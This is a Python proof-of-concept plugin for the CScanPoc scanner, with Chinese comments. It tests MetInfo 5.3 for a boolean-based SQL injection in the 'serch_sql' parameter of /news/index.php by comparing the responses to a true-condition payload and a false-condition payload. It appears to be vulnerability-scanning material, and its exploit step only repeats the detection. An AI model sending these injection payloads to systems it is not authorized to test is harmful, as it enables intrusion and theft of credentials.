# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0006_p'  # 平台漏洞编号，留空
    name = 'MetInfo 5.3 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-09'  # 漏洞公布时间
    desc = '''
        MetInfo CMS中 search_sql 变量没有过滤直接带入 SQL 语句导致注入，可以获取管理员的账号密码，造成信息泄露甚至数据库被拖。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=70827'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'MetInfo 5.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '15eaae71-00a9-4e55-bf88-8d4d8af1f7ce'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 布尔类型注入,构造错误,判断页面两次返回是否正常
            payloadtrue = '''?serch_sql=%20123qwe%20where%201234%3D1234%20--%20x&imgproduct=xxxx'''
            payloadfalse = '''?serch_sql=%20123qwe%20where%201234%3D1233%20--%20x&imgproduct=xxxx'''

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request1 = requests.get(
                '{target}/news/index.php{payload}'.format(target=self.target, payload=payloadtrue))
            request2 = requests.get(
                '{target}/news/index.php{payload}'.format(target=self.target, payload=payloadfalse))

            if request1.text != request2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
